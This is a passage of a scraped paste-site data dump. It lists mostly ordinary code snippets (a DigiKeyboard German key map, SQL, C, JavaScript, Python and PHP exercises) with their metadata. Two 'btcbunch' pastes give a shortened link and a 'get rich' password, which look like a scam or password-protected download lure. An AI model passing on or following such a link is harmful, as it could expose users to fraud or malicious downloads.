\xa0 \xa0 \xa0 \xa0 \xa0 0x64, \xa0 \xa0 \xa0// <\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// =\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// >\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2D|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// ?\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0// @ 0x40 0x14\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x04|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// A\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x05|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// B\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x06|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// C\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x07|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// D\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x08|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// E\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x09|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// F\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0a|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// G\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0b|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// H\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0c|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// I\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0d|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// J\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0e|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// K\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0f|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// L\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x10|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// M\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x11|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// N\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x12|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// O\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x13|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// P\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Q\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x15|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// R\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x16|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// S\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x17|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// T\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x18|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// U\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x19|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// V\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1a|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// W\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1b|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// X\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1d|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Y\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1c|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0// Z\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x25|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// [\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2d|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// bslash\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x26|DE_MOD_ALT_RIGHT, \xa0 \xa0 \xa0 \xa0 \xa0// ]\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x35, \xa0 \xa0// ^\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x38|DE_MOD_SHIFT_LEFT, \xa0 \xa0// _\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x2E|DE_MOD_SHIFT_LEFT, \xa0 \xa0 \xa0 \xa0 \xa0// `\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x04, \xa0 \xa0 \xa0 \xa0 \xa0// a\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x05, \xa0 \xa0 \xa0 \xa0 \xa0// b\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x06, \xa0 \xa0 \xa0 \xa0 \xa0// c\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x07, \xa0 \xa0 \xa0 \xa0 \xa0// d\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x08, \xa0 \xa0 \xa0 \xa0 \xa0// e\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x09, \xa0 \xa0 \xa0 \xa0 \xa0// f\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0a, \xa0 \xa0 \xa0 \xa0 \xa0// g\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0b, \xa0 \xa0 \xa0 \xa0 \xa0// h\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0c, \xa0 \xa0 \xa0 \xa0 \xa0// i\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0d, \xa0 \xa0 \xa0 \xa0 \xa0// j\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0e, \xa0 \xa0 \xa0 \xa0 \xa0// k\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x0f, \xa0 \xa0 \xa0 \xa0 \xa0// l\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x10, \xa0 \xa0 \xa0 \xa0 \xa0// m\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x11, \xa0 \xa0 \xa0 \xa0 \xa0// n\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x12, \xa0 \xa0 \xa0 \xa0 \xa0// o\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x13, \xa0 \xa0 \xa0 \xa0 \xa0// p\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x14, \xa0 \xa0 \xa0 \xa0 \xa0// q\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x15, \xa0 \xa0 \xa0 \xa0 \xa0// r\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x16, \xa0 \xa0 \xa0 \xa0 \xa0// s\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x17, \xa0 \xa0 \xa0 \xa0 \xa0// t\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x18, \xa0 \xa0 \xa0 \xa0 \xa0// u\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x19, \xa0 \xa0 \xa0 \xa0 \xa0// v\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1a, \xa0 \xa0 \xa0 \xa0 \xa0// w\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1b, \xa0 \xa0 \xa0 \xa0 \xa0// x\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1d, \xa0 \xa0 \xa0 \xa0 \xa0// y\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x1c, \xa0 \xa0 \xa0 \xa0 \xa0// z\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x24|DE_MOD_ALT_RIGHT, \xa0 \xa0// {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x64|DE_MOD_ALT_RIGHT, \xa0 \xa0// |\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x27|DE_MOD_ALT_RIGHT, \xa0 \xa0// }\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0x30|DE_MOD_ALT_RIGHT, \xa0 \xa0// ~\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 0 \xa0 \xa0 \xa0 // DEL\n\xa0 \xa0 \xa0 \xa0 };\n\xa0\nclass DigiKeyboardDeviceDe : public DigiKeyboardDevice{\n\xa0 \xa0 public:\n\xa0 \xa0 size_t write(uint8_t chr) {\n\xa0 \xa0 \xa0 \xa0 unsigned int temp = pgm_read_word_near(_ascii_de_map + chr);\n\xa0 \xa0 \xa0 \xa0 unsigned char low = temp & 0xFF;\n\xa0 \xa0 \xa0 \xa0 unsigned char high = (temp >> 8) & 0xFF;\n\xa0 \xa0 \xa0 \xa0 sendKeyStroke(low,high);\n\xa0 \xa0 \xa0 \xa0 return 1;\n\xa0 \xa0 }\n\xa0 \xa0 void sendKeyReport(uchar *array,const unsigned int size){\n\xa0 \xa0 \xa0 \xa0 while (!usbInterruptIsReady()) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // Note: We wait until we can send keyPress\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // \xa0 \xa0 \xa0 so we know the previous keyPress was\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 // \xa0 \xa0 \xa0 sent.\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 usbPoll();\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 _delay_ms(5);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0\n\xa0 \xa0 \xa0 \xa0 usbSetInterrupt(array, size);\n\xa0 \xa0 }\n};\nDigiKeyboardDeviceDe DigiKeyboardDe = DigiKeyboardDeviceDe();\n#endif //DIGIKEYBOARDDE_H', date='2022-06-01 13:07:38 +00:00', hash_val='be263aa347259a4cf33f40779d0d1d31', url='/xQHPkXSh', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Maks140888', title='Untitled', content="CREATE TYPE objects_below IS TABLE OF VARCHAR2(200);\n\xa0\ncreate or replace function find_objects_below(obj_x VARCHAR2)\nreturn objects_below as object_name \xa0objects_below;\nbegin \n\xa0 \xa0 select name \n\xa0 \xa0 bulk collect into object_name\n\xa0 \xa0 FROM objects \n\xa0 \xa0 START WITH objects.name = obj_x\n\xa0 \xa0 CONNECT by prior object_id = parent_id;\n\xa0\n\xa0 \xa0 return object_name;\nend;\n\xa0\nselect * from \xa0table(find_objects_below('розклад'));", date='2022-06-01 13:05:12 +00:00', hash_val='fa44e91eb93210b2eca56ef9b3f12e6e', url='/KkH3NTqf', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='_takumi', title='hw6.c', content='#include <math.h>\n#include <stdio.h>\n#include <stdbool.h>\n\xa0\ntypedef double afunc(double);\n\xa0\ndouble f(double x) {\n\xa0 \xa0 return -x*x+10;\n}\n\xa0\ndouble g(double x) {\n\xa0 \xa0 return x;\n}\n\xa0\ndouble root(afunc *f, afunc *g, double a, double b, double eps1) {\n\xa0 \xa0 double Fa, Fb, c;\n\xa0 \xa0 bool one_sign;\n\xa0 \xa0 while (true) {\n\xa0 \xa0 \xa0 \xa0 Fa = f(a) - g(a);\n\xa0 \xa0 \xa0 \xa0 Fb = f(b) - g(b);\n\xa0 \xa0 \xa0 \xa0 c = (a * Fb - b * Fa) / (Fb - Fa);\n\xa0 \xa0 \xa0 \xa0 one_sign = (Fa > 0) && (f((a + b) / 2) > (Fa - Fb) / 2)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0|| (Fa < 0) && (f((a+b)/2) < (Fa - Fb) / 2);\n\xa0 \xa0 \xa0 \xa0 if (one_sign) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 a = c;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if ((f(c) - g(c)) * (f(c + eps1) - g(c + eps1)) < 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 else {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 b = c;\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if ((f(c) - g(c)) * (f(c - eps1) - g(c - eps1)) < 0)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 }\n\xa0 \xa0 return c;\n}\n\xa0\ndouble integral(afunc *f, double a, double b, double eps2) {\n\xa0 \xa0 const double p = 1/3;\n\xa0 \xa0 double n0 = 10;\n\xa0 \xa0 double h, I, In = 0, I2n = 0; //i2n - curr, in - prev\n\xa0 \xa0 while (true) {\n\xa0 \xa0 \xa0 \xa0 In = I2n;\n\xa0 \xa0 \xa0 \xa0 h = (b - a) / n0;\n\xa0 \xa0 \xa0 \xa0 I2n = 0;\n\xa0 \xa0 \xa0 \xa0 for (int i = 0; i < n0; ++i) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 I2n += f(a + (i + 0.5) * h);\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 I2n *= h;\n\xa0 \xa0 \xa0 \xa0 if ((In != 0) && (eps2 > p * fabs(In - I2n))) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break;\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 n0 *= 2;\n\xa0 \xa0 }\n\xa0 \xa0 I = I2n;\n\xa0 \xa0 return I;\n}\n\xa0\nint main(void) {\n\xa0 \xa0 printf(""%lf"", integral(f, -1, 1, 0.000000000001));\n\xa0 \xa0 return 0;\n}', date='2022-06-01 12:48:17 +00:00', hash_val='fce26d584174850efdabb82a0ccd4ee9', url='/A5PrM16v', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='HendarOfficial', title='btcbunch2', content='Link: https://cararegistrasi.com/8aM52Mp \nPass: pengencepetkaya?NGEPET', date='2022-06-01 12:46:38 +00:00', hash_val='8643ca00de48f8fb814c113cb1706960', url='/27LLDR46', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='HendarOfficial', title='btcbunch', content='pengencepetkaya?NGEPET', date='2022-06-01 12:45:19 +00:00', hash_val='fc5d8fe7f92d8fd38f6bd5e4848d452a', url='/QLzUVVFP', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Dragomana', title='Service', content='function solve() {\n\xa0 \xa0 let secComplete = document.getElementById(\'completed-orders\')\n\xa0 \xa0 let secRcvOrders = document.getElementById(\'received-orders\')\n\xa0 \xa0 let nameProd = document.getElementById(\'type-product\')\n\xa0 \xa0 let problemDesc = document.getElementById(\'description\')\n\xa0 \xa0 let client = document.getElementById(\'client-name\')\n\xa0 \xa0 let phone = document.getElementById(\'client-phone\')\n\xa0 \xa0 let btnSubmit = document.querySelector(\'button[type=""submit""]\')\n\xa0 \xa0 btnSubmit.addEventListener(\'click\', submitOrder)\n\xa0 \xa0 let btnClear = document.querySelector(\'#completed-orders > button\')\n\xa0 \xa0 btnClear.addEventListener(\'click\', (e) => {\n\xa0 \xa0 \xa0 \xa0 let divClear = e.target.parentNode\n\xa0 \xa0 \xa0 \xa0 while(divClear.children[3]){\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 divClear.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 })\n\xa0\n\xa0 \xa0 // problemDesc.value = \'Bad Battery\'\n\xa0 \xa0 // client.value = \'Some Name\'\n\xa0 \xa0 // phone.value = \'08888888\'\n\xa0 \xa0 \n\xa0 \xa0 function submitOrder(e) {\n\xa0 \xa0 \xa0 \xa0 e.preventDefault()\n\xa0 \xa0 \xa0 \xa0 \nif(!problemDesc.value || !client.value || !phone.value){\n\xa0 \xa0 return\n}\n\xa0\n\xa0 \xa0 \xa0 \xa0 let div = document.createElement(\'div\')\n\xa0 \xa0 \xa0 \xa0 let h2 = document.createElement(\'h2\')\n\xa0 \xa0 \xa0 \xa0 let h3 = document.createElement(\'h3\')\n\xa0 \xa0 \xa0 \xa0 let h4 = document.createElement(\'h4\')\n\xa0 \xa0 \xa0 \xa0 let btnStart = document.createElement(\'button\')\n\xa0 \xa0 \xa0 \xa0 let btnFinish = document.createElement(\'button\')\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 div.classList.add(\'container\')\n\xa0 \xa0 \xa0 \xa0 h2.textContent = `Product type for repair: ${nameProd.value}`\n\xa0 \xa0 \xa0 \xa0 h3.textContent = `Client information: ${client.value}, ${phone.value}`\n\xa0 \xa0 \xa0 \xa0 h4.textContent = `Description of the problem: ${problemDesc.value}`\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 btnStart.classList.add(\'start-btn\')\n\xa0 \xa0 \xa0 \xa0 btnStart.textContent = \'Start repair\'\n\xa0 \xa0 \xa0 \xa0 btnStart.addEventListener(\'click\', () => {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 btnFinish.disabled = false\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 btnStart.disabled = true\n\xa0 \xa0 \xa0 \xa0 })\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 btnFinish.classList.add(\'finish-btn\')\n\xa0 \xa0 \xa0 \xa0 btnFinish.textContent = \'Finish repair\'\n\xa0 \xa0 \xa0 \xa0 btnFinish.disabled = true\n\xa0 \xa0 \xa0 \xa0 btnFinish.addEventListener(\'click\', finishAction)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 function finishAction(e) {\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 let newDiv = e.target.parentNode\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newDiv.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 newDiv.children[3].remove()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 console.log(newDiv);\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 secComplete.appendChild(div)\n\xa0 \xa0 \xa0 \xa0 }\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h2)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h3)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(h4)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(btnStart)\n\xa0 \xa0 \xa0 \xa0 div.appendChild(btnFinish)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 secRcvOrders.appendChild(div)\n\xa0\n\xa0 \xa0 \xa0 \xa0 problemDesc.value = \'\'\n\xa0 \xa0 \xa0 \xa0 client.value = \'\'\n\xa0 \xa0 \xa0 \xa0 phone.value = \'\'\n\xa0 \xa0 }\n}', date='2022-06-01 12:09:10 +00:00', hash_val='115da38eddeceac882850d1e2ab4d1b6', url='/3Gh74aqt', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Tss_Flmzy', title='MVP для приложения "Пенькофф Инвестиции"', content="input_file = open('input.txt')\n\xa0\nn = int(input_file.readline())\nnames = dict()\nactioners = dict()\n\xa0\nfor line in input_file.readlines():\n\xa0 \xa0 line = line.split()\n\xa0\n\xa0 \xa0 answer = line[0]\n\xa0 \xa0 data = line[1:]\n\xa0\n\xa0 \xa0 if answer == 'BUY':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name, actioner, count = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1\n\xa0\n\xa0 \xa0 \xa0 \xa0 count = int(count)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name not in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name] = dict({actioner: int(count)})\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if actioner not in names[name]:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = count\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] += count\n\xa0\n\xa0 \xa0 elif answer == 'SELL':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name, actioner, count = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1\n\xa0\n\xa0 \xa0 \xa0 \xa0 count = int(count)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if actioner in names[name]:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] -= count\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if names[name][actioner] < 0:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 names[name][actioner] = 0\n\xa0\n\xa0 \xa0 elif answer == 'PRICE_RAISE':\n\xa0\n\xa0 \xa0 \xa0 \xa0 actioner, percents = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 percents = float(percents)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1 + percents / 100\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] *= 1 + percents / 100\n\xa0\n\xa0 \xa0 elif answer == 'PRICE_FALL':\n\xa0\n\xa0 \xa0 \xa0 \xa0 actioner, percents = data\n\xa0\n\xa0 \xa0 \xa0 \xa0 percents = float(percents)\n\xa0\n\xa0 \xa0 \xa0 \xa0 if actioner not in actioners:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] = 1 - float(percents) / 100\n\xa0 \xa0 \xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 actioners[actioner] *= 1 - float(percents) / 100\n\xa0\n\xa0 \xa0 elif answer == 'BALANCE':\n\xa0\n\xa0 \xa0 \xa0 \xa0 name = data[0]\n\xa0\n\xa0 \xa0 \xa0 \xa0 balance = 0\n\xa0\n\xa0 \xa0 \xa0 \xa0 if name in names:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for (actioner, count) in names[name].items():\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 balance += count * actioners[actioner]\n\xa0\n\xa0 \xa0 \xa0 \xa0 print(round(balance))", date='2022-06-01 12:04:44 +00:00', hash_val='094f99d6ae436bec04858a7b6cb6315a', url='/3uzkDY3Q', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='Paste Ping', content='PasteBin API Check', date='2022-06-01 12:01:23 +00:00', hash_val='ce23c8313fe51c917a33b8b14e05f10a', url='/Sw34xvVF', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='MartinGeorgiev', title='01. SoftUni Reception', content='<?php\n\xa0\n$a = readline();\n$b = readline();\n$c = readline();\n$questions = 